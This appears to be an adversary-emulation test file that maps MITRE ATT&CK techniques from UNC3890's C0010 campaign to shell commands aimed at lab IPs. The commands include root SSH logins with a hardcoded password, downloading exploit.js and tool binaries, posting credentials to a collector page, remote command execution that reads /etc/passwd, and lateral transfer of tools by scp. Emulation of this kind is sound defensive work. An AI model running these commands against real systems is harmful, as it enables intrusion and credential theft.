name: T1584.001 - Domains
description: During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.

executors.name: sh
executors.command: sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --resolve oldsub.legitshipping.co.il:80:172.22.0.20 http://oldsub.legitshipping.co.il/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'

name: T1608.001 - Upload Malware
description: For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.

name: T1189 - Drive-by Compromise
description: During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.

executors.name: sh
executors.command: curl http://172.21.0.20/ > /dev/null && curl http://172.21.0.20:5000/exploit.js > /tmp/exploit.js && curl --data "username=victim&password=Passw0rd" http://172.21.0.20/foca.php

name: T1608.004 - Drive-by Target
description: For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.

name: T1587.001 - Malware
description: For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.

executors.name: sh
executors.command: curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5015/exec

name: T1583.001 - Domains
description: For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.

name: T1105 - Ingress Tool Transfer
description: During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.

executors.name: sh
executors.command: sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget;sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'chmod +x /tmp/wget && /tmp/wget -O /tmp/tool.sh http://172.21.0.20/tool.sh && /tmp/wget -O /tmp/tool.bin http://172.21.0.20/tool.bin';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.sh root@172.22.0.20:/tmp/tool.sh';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.bin root@172.22.0.20:/tmp/tool.bin'

name: T1608.002 - Upload Tool
description: For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.

name: T1588.002 - Tool
description: For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.

executors.name: sh
executors.command: curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5000/exec
